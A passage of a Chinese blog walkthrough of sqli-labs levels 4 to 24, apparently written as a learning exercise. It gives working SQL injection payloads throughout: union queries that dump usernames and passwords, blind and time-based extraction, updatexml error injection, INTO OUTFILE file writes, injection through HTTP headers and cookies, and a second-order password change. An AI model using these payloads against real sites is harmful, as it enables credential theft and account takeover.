class="line">?id=-1&quot;) union select 1,2,group_concat(username,&#x27;.&#x27;,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719763165392-01dc6bd4-4ea5-4cfe-8ece-678aac74ff9b.png"></p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>当我们输入?id&#x3D;1时，发现跟之前不同了，没有回显位</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719763285550-374ea386-b5c2-4262-85fb-d505682c94aa.png"></p><p>确定注入类型：</p><p>输入1 and 1&#x3D;1和1 and 1&#x3D;2页面回显正常，排除数字型</p><p>输入1’ and ‘1’&#x3D;’1页面回显正常，1’ and ‘1’&#x3D;’2页面回显空白，确定为字符型</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719763331322-bca8a9f8-551f-4ce5-a5e6-c964bebc12be.png"></p><p>因此可知道为字符型盲注，且有两种页面（有回显和无回显）我们可以使用布尔盲注</p><blockquote><p>布尔盲注相对来说花费的时间较久</p><ol><li>判断是否存在注入</li><li>获取数据库长度</li><li>逐字猜解数据库名</li><li>猜解表名数量</li><li>猜解某个表名长度</li><li>逐字猜解表名</li><li>猜解列名数量</li><li>猜解某个列名长度</li><li>逐字猜解列名</li><li>判断数据数量</li><li>猜解某条数据长度</li><li>逐位猜解数据</li></ol></blockquote><p>判断字段数和之前操作相同，使用order by</p><ul><li>判断数据库名</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断数据库名长度，使用length()</span><br><span class="line">?id=1&#x27; and length(database())&gt;8--+</span><br><span class="line">//&gt;7时有回显，为true，&gt;8时无回显，为false，说明数据库名长度为8</span><br><span class="line"></span><br><span class="line">判断数据库名，使用substr()</span><br><span class="line">?id=1&#x27; and substr(database(),1,1)&gt;&#x27;a&#x27;--+</span><br><span class="line">//更改&#x27;a&#x27;参数可以判断对应位的字符，更改substr的第二个参数可以获取每一位（1-8）</span><br><span class="line"></span><br><span class="line">可以使用bp爆破</span><br></pre></td></tr></table></figure><p>这两个位置打上爆破点，同时使用bomb爆破（几等奖）<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719766027356-a0ed08f0-ae7f-4531-a5b3-da539c1f6cbe.png"></p><p>payload1为1-8（数据库名长度位8，爆破每一位）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719765426678-c4b4149c-9861-4015-b27c-bf83be77b4ae.png"></p><p>payload2为a-z字母（数据库名的每一位上的字符）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719765459749-cb47c49c-5f80-4658-8516-6591ac4e8e06.png"></p><p>爆破结果，得出数据库名security</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719766203434-66270000-003d-49c6-b5b0-da77b1df9f90.png"></p><ul><li>判断表名</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断表的数量，使用count()</span><br><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)&gt;4 --+</span><br><span class="line">//更改参数4（从1开始，到4发现为false，一共三张表）</span><br><span class="line"></span><br><span class="line">判断表名长度，使用length()</span><br><span class="line">?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)&gt;4 --+</span><br><span class="line">//更改参数4（从1开始递增，可以找到表名长度）</span><br><span class="line">//更改limit 第一个参数（0-2 一共三张表），可以获取每个表的表名长度</span><br><span class="line"></span><br><span class="line">获取表名，使用substr()和ascii()</span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;65 --+</span><br><span class="line">//65表示字符的ascii码，从65（A）开始递增，爆破出位上的具体字符</span><br><span class="line">//substr的第二个参数，表示某张表的位数</span><br><span class="line">//limit的第一个参数，表示第几张表（0-3）</span><br></pre></td></tr></table></figure><ul><li>判断列名</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断列的数量</span><br><span class="line">?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=&#x27;security&#x27;)&gt;1--+</span><br><span class="line"></span><br><span class="line">判断列名长度</span><br><span class="line">?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;user&#x27; limit 0,1)&gt;1--+</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;user&#x27; limit 0,1),1,1))&gt;65 --+</span><br></pre></td></tr></table></figure><ul><li>获取具体数据</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取列中有多少行数据</span><br><span class="line">?id=1&#x27; and (select count(username) from users)=8--+</span><br><span class="line"></span><br><span class="line">获取内容长度</span><br><span class="line">?id=1&#x27; and (select length(username) from users limit 0,1)=1--+</span><br><span class="line"></span><br><span class="line">获取具体数据</span><br><span class="line">?id=1&#x27; and ascii(substr((select user from users limit 0,1),1,1))&gt;65--+</span><br></pre></td></tr></table></figure><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>输入<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>、<code>1&#39; and &#39;1&#39;=&#39;2</code>页面都正常，使用双引号，发现为双引号闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719768234916-a3097a90-7a90-4809-868c-2a3fd187b4f5.png"></p><p>将单引号换成双引号，其他步骤和Less-5相同</p><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719837928589-652f9aa5-4c71-430b-8850-1deaf6d27ebb.png"></p><p>我们先判断闭合方式，当输入1’（报错），1”（不报错）-&gt;继续尝试?id&#x3D;1’–+（报错），因此判断闭合符可能为单引号加括号，经过尝试得出闭合方式为单引号加两个括号</p><p>闭合方式为<code>?id=1&#39;))--+</code></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719838737403-fa49d053-e741-46a1-ad4a-f57543996c1e.png"></p><p>接下来就可以用布尔盲注一步步注出来</p><p>由于这关提示说让使用outfile，我去搜了一下outfile的用法</p><p><a href="https://www.runoob.com/mysql/mysql-database-export.html">MySQL 导出数据 | 菜鸟教程</a></p><blockquote><p>MySQL 中你可以使用 SELECT…INTO OUTFILE 语句来简单的导出数据到文本文件上。</p><p>需要开启文件写入权限（mysql配置文件）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">INTO OUTFILE &#x27;file_path&#x27;</span><br><span class="line">FROM your_table</span><br><span class="line">WHERE your_conditions;</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">column1, column2, ...: 要选择的列。</span><br><span class="line">&#x27;file_path&#x27;: 指定输出文件的路径和名称。</span><br><span class="line">your_table: 要查询的表。</span><br><span class="line">your_conditions: 查询条件。</span><br></pre></td></tr></table></figure><p>在使用outfile之前，因为要使用select，我们需要先判断字段数</p><p>得出字段数为3</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) order by 4--+</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719839179707-abfdd8e6-44d4-4250-aa1c-80920101d744.png"></p><p>构造outfile语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select id,username,password into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\temp.txt&#x27; from users --+</span><br></pre></td></tr></table></figure><blockquote><p>这里由于转义，路径\要进行双写</p></blockquote><p>执行过后，在我的路径下可以看到生成的temp.txt文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719839856506-d62820c6-2d72-49b4-8eb8-00843a7d5ede.png"></p><p>查看文件内容，可以看出我们构造语句的内容得到了输出</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719839863643-dec38bb4-a576-40fb-931a-a31e8babae85.png"></p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>输入id&#x3D;1页面正常，id&#x3D;1’页面空白，存在注入</p><p>接下来开始判断注入类型</p><p>当输入1’ and ‘1’&#x3D;’2时，页面空白，说明注入类型为字符型，闭合符为单引号</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719840336277-3b2780d2-5dfb-4800-8f04-d853b20f84d2.png"></p><p>使用布尔盲注，步骤和Less-5一样</p><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>不管我们输入什么，页面回显都是一样的，这是布尔盲注已经不适用了（布尔盲注适用于对于true和false两种情况回显不同）我们可以使用时间盲注</p><p>时间盲注和布尔盲注类似，通过页面响应时间来判断sql语句是否执行</p><p>判断注入类型</p><p>当执行1’ and sleep(3)–+时页面响应时间长，大概延长了3s，确定为字符型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and sleep(3)</span><br><span class="line">1&#x27; and sleep(3)%23</span><br></pre></td></tr></table></figure><p>使用if函数</p><blockquote><p><code>if(expr1,expr2,expr3)</code>第一个条件成立就执行expr2，否则执行expr3</p></blockquote><p>判断数据库长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(database())&gt;8,sleep(3),1)--+</span><br></pre></td></tr></table></figure><p>其他的步骤和布尔盲注相同，只需要把布尔盲注的语句填入if中的第一个参数即可</p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>我们执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and sleep(3)</span><br><span class="line">1&#x27; and sleep(3)%23</span><br></pre></td></tr></table></figure><p>发现页面响应时间相同，sleep没有生效，尝试其他闭合</p><p>通过判断得到为双引号闭合，其余语句和Less-9相同，将单引号改为双引号即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and sleep(3)--+</span><br></pre></td></tr></table></figure><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>和之前的界面都不一样</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719842483957-3455edcc-e639-423a-b585-75a9ef8f9d20.png"></p><p>我们随便输入内容，submit后发现url中没有参数，得知为POST请求，我们可以直接在输入框中注入</p><p>当我们输入1’，出现报错信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719842679289-c8f98d4a-bf0b-4170-ba13-da065860d1f9.png"></p><p>由报错信息可得，只需要闭合单引号即可</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719843244244-3545698d-37f6-46e8-a253-79b010dcd9bb.png"></p><p>这里我直接在网站里用，–+注释符会报错，用#注释不会报错，可以用#</p><p>但是我用bp抓包之后，用–+就不会报错</p><blockquote><p><font style="background-color:#E4495B;">这里不是太懂，希望师傅们可以传授一二</font></p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719843498640-396345ad-5e9f-499b-8938-20370cd6bf45.png"></p><p>下面我就用#注释</p><p>判断列数：</p><p>得到由两列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;order by 3#</span><br></pre></td></tr></table></figure><p>之后就使用union联合注入即可</p><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>我们输入1和1’页面都没有报错，尝试双引号</p><p>并由报错信息得，为双引号括号闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719843977907-2596f910-365d-49ec-815f-744c177ee5fb.png"></p><p> 页面正常<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719844008677-1b0e37fb-be58-4d66-9b3c-f0d94159b573.png"></p><p>判断列数：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719844048374-8a259163-c111-46f1-b732-3a4a1e419945.png"></p><p>接下来步骤还是使用union联合查询注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot;) union select group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719844196395-403ae8c7-ae4b-444f-b122-ece6fe17a533.png"></p><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>和Less-12一样，只需要把双引号换为单引号即可，为单引号加括号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;)#</span><br></pre></td></tr></table></figure><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>和Less-12一样，为双引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot;#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719844532771-2c4f83f9-e215-41c4-9c9e-84651f87248c.png"></p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>无论我们输入什么内容，页面都只有一种回显，因此考虑时间盲注</p><p>输入下面内容，发现页面响应时间延迟3s，sleep函数生效</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and sleep(3)#</span><br></pre></td></tr></table></figure><blockquote><p>这里犯了一个低级的错误，由于之前查询的一直是id，刚开始构造语句写成了1’ and sleep(3)#，一直无法生效，后来一想，哪有1这个username，怎么可能成功…</p></blockquote><p>后面的步骤就使用时间盲注，可以参考Less-9</p><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>首先无论输入什么页面只有一种回显，考虑时间盲注</p><p>我分别尝试了以下几种</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin and sleep(3)</span><br><span class="line">admin&#x27; and sleep(3)#</span><br><span class="line">admin&quot; and sleep(3)#</span><br><span class="line">admin&#x27;) and sleep(3)#</span><br><span class="line">admin&quot;) and sleep(3)#//当尝试到这一步时，sleep生效</span><br></pre></td></tr></table></figure><p>后面的步骤使用时间盲注即可</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p><a href="https://www.cnblogs.com/linfangnan/p/13834250.html">sqli-labs 通关指南：Less 17 - 乌漆WhiteMoon - 博客园</a></p><blockquote><p>这一关这位师傅的文章讲的很清晰</p></blockquote><p>总结来讲就是这关有两个sql语句，第一个输入框中输入已知的用户名admin，在第二个输入框中进行注入</p><p>第二个输入框中输入1’成功触发报错</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719847263170-69d1964b-d012-4c0f-9911-811fdc540721.png"></p><p>使用updatexml()</p><p>爆破出数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,database()),1)#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719847511705-b850b51f-7d6e-410b-9afb-783d45aaf837.png"></p><p>当我们想从users表中获取信息时</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),1)#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719847753692-8313a47c-3f50-4b5c-8e30-fc38ea3e404c.png"></p><blockquote><p>这里我们无法直接从 users 表拿数据，我们可以先用一个表暂存从 users 表中取出所有数据的查询，然后再从这个暂存的表中取出数据。构造出的 payload 如下，思路就是利用一个查询从另一个查询中取出数据，以此绕过表的限制。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,password) from (SELECT username,password FROM users)text limit 0,1)),1)#</span><br><span class="line"></span><br><span class="line">//text为我们构造的子表的别名</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719848422822-fce6f74f-bc13-4776-9c67-bb026813814c.png"></p><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719848610349-ca8ca514-8b7e-431a-ae0c-33193822b085.png"></p><p>这一关比之前的信息多了一个your ip address</p><p>可能是会记录每次访问的ip地址，想到uagent注入</p><p>源码中对账号和密码做了检查判断，我们要先输入正确的账号密码才能绕过账号密码的判断，才能进入处理uagent</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719899708426-94021348-1424-48c1-9555-94096f512c4b.png"></p><p>输入正确的账号密码后，更改uagent</p><p>直接在uagent后面加上单引号，发现报错信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719901230734-b271926c-01f2-4329-af8a-9f04568a5f97.png"></p><p>sql语句可能为insert into 表 values(‘uagent’,’ip’,’uname’)</p><p>我们在uagent注入，闭合需要使用单引号和括号，我们输入1’,2,3)#进行闭合（要符合values语法）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719901479584-42ce78e0-269e-4661-9928-4b3d8b0a5dbd.png"></p><p>闭合成功</p><p>接下来我们使用报错注入，构造payload</p><p>获取数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,2,updatexml(1,concat(0x7e,database()),1))#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719901945498-20851c1c-9731-430b-bfe1-70cab9fbc33d.png"></p><p>获取表名</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719902060705-ac597205-1b3c-48a4-8691-e299a339d598.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1))#</span><br></pre></td></tr></table></figure><p>接下来的操作进行报错注入即可</p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>当我们输入正确的账号密码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719902204324-3dbd6342-eca6-40bb-8a7b-1609a243dff2.png"></p><p>发现一个referer回显，加入单引号测试</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719902253849-a4619567-b164-44b5-818e-4d5d2322e21d.png"></p><p>回显报错信息</p><p>sql语句可能为insert into 表 values(‘referer’,’ip’)，我们尝试闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719903166992-e53fb5e2-728c-4725-998a-ed67ab438e67.png"></p><p>闭合成功，开始注入，构造payload</p><p>数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,updatexml(1,concat(&#x27;~&#x27;,database()),1))#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719903253787-a69d1c10-a246-4d2f-933a-451bfa9d4bf4.png"></p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>当我们正确登录后，发现页面返回了大量的信息，还有一个删除cookie的按钮</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719903666806-0c6f7ffe-ab68-415c-8b9b-8fe940fad644.png"></p><p>当我们再次刷新页面时，没有回到登录页面，这应该是cookie的作用</p><blockquote><p>cookie 是网站为了辨别用户身份，进行 Session 跟踪而储存在用户本地终端上的数据。想要回到登录页面，我们需要先把 cookie 清除掉。</p></blockquote><p>当我们点击delete your cookie按钮，即可回到登陆的页面</p><p>尝试在输入框中进行注入，发现无法注入，为了找到注入点，我们进行抓包</p><p>在用正确的账号密码登录之后，我们发现请求包里有一个cookie字段，当我们刷新之后，新的请求包里也存在这个cookie，可以推断就是因为这个cookie才能够保留我们的登录信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719904295647-cbc0da73-c037-497a-b7d8-f7a473016b11.png"></p><p>对cookie测试，触发报错，找到注入点</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719904360431-5d30e3fe-9238-4eae-a528-acac0777a1fe.png"></p><p>使用#闭合，报错信息消失，成功闭合，有显示位，我们使用联合查询</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719904516270-06126954-f2cc-44da-a15e-81b6a4c4b9b1.png"></p><p>判断列数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;order by 4#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719904651070-80198021-46b9-47c7-8c89-d6704e06984a.png"></p><p>确定显示位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,2,3#</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719904756537-79aafb95-ec26-4ced-a9d4-f3a543032379.png"></p><p>获取数据库名</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719904712313-80dc319a-90ed-44c9-9386-be1720fc6ebc.png"></p><p>接下来就为正常的联合查询注入即可</p><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>这一关和20关类似，我们以正确账号密码登录后，抓包</p><p>可以看到这次的cookie是加密的</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719905841608-5486c6bb-6638-4aae-a4cf-df2d1e03c58f.png"></p><p>”%3D“是 URL 编码中的等号，这个形式我们会优先考虑是 base64 编码</p><p>使用base64解码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719905961776-f29359b1-c018-4a0f-b66f-9b7a99f60992.png"></p><p>解码之后为admin</p><p>因此可以得出，cookie的内容只是经过了依次base64编码，我们在注入时也进行base64编码即可</p><p>首先加单引号测试注入点</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906097721-a76acfb8-5276-4e85-8123-df0d93743ff2.png"></p><p>得到报错，根据报错内容可以得知需要括号进行闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906143701-6f58f9cb-d07d-43cb-88f0-54c30d9c01dc.png"></p><p>构造闭合admin’)#</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906251554-153012f6-8093-44a7-8582-2f7626cf03d0.png"></p><p>报错消失，闭合成功（这里橙色部分是我的sqlilab可能配置出了点问题导致的）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906266419-faad1765-50a5-4849-85cb-a0ac8a8e26e2.png"></p><p>因为有显示位，我们使用联合查询注入</p><p>判断列数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906373000-3efa4b45-dfb2-4d01-b6e8-07ce820cc27e.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906366119-cce95d2c-57bc-4740-b90b-8658f0c9fece.png"></p><p>确定显示位</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906572377-6508cbf8-8443-4e80-aa70-865dc98e3b02.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906578166-587e5948-ef19-4ade-a828-99e1526ee8af.png"></p><p>接下来就和联合查询注入步骤一样</p><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>和Less-21差不多，我们以正确账号密码登录之后，抓包，发现还是有cookie</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719906977187-b0ae1cf5-5c7b-4ede-af82-40044d4924de.png"></p><p>同样也是base64编码</p><p>开始测试，结果为双引号闭合base64编码</p><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>我们输入?id&#x3D;1页面正常，开始探测，输入?id&#x3D;1’页面报错，确定存在注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719926692976-03749e77-86b0-4f98-9a25-0cb1eb6dcefc.png"></p><p>判断注入类型，用万能公式 <code>1&#39; and &#39;1&#39;=&#39;1</code> 和<code>1&#39; and &#39;1&#39;=&#39;2</code>来判断</p><p>输入前者页面回显正常，输入后者页面回显空白，确定为字符型注入单引号闭合</p><p>但当我想要接着判断列数时，产生报错</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719926893280-0da50528-598f-4ae1-ad1a-7b09216e9153.png"></p><p>由报错信息可知原因是单引号未闭合，可能是注释符被过滤，尝试#也不行</p><p>改变思路，如果我们不能用注释符，那我们就不能用order by来判断列数，想要使页面不报错，我们可以使用万能公式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;  union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">我们可以依次增加联合查询的字段数来判断列数</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719927340798-fb88df6f-b101-4501-80da-34fe6d44c3b0.png"></p><p>得到列数为3，且确定了显示位</p><p>查询数据库名</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719927493864-741e8584-35b9-4fd8-9a7c-a1511312ce08.png"></p><p><font style="background-color:#E4495B;">（但是这里我更改select的第一个字段的值，回显的Your Password的值也没有进行改变，不清楚是什么原因）</font></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取表名</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">获取具体数据</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(username,&#x27;.&#x27;,password) from users),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><p>一共三个页面：登录页面、注册页面、忘记密码页面</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719928292834-ec5f8760-84c3-41c1-a045-c2bc0f94d5a1.png"></p><p>看到这里我们可以思考有什么可以注入的地方，在修改密码的时候会带入查询，</p><p>我们先注册一个用户admin’#（为闭合做准备）</p><p>登录后，修改他的密码，我们这里原密码为123546，修改为111111</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719929120461-1784c0eb-0f0b-4285-8209-657c53e88a5a.png"></p><p>回显 显示修改成功</p><p>此时修改的是admin的密码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719929214008-467b344f-5836-40ee-8a29-a2fa10e453ba.png"></p><p>原因就是当我们在修改密码时带入的查询，在修改的用户名处进行了注入，我们的用户名admin’#经过单引号闭合和注释变成了admin，我们修改的就为admin的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;111111&#x27; where username=&#x27;admin &#x27;#&#x27;</span><br></pre></td></tr></table></figure><h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
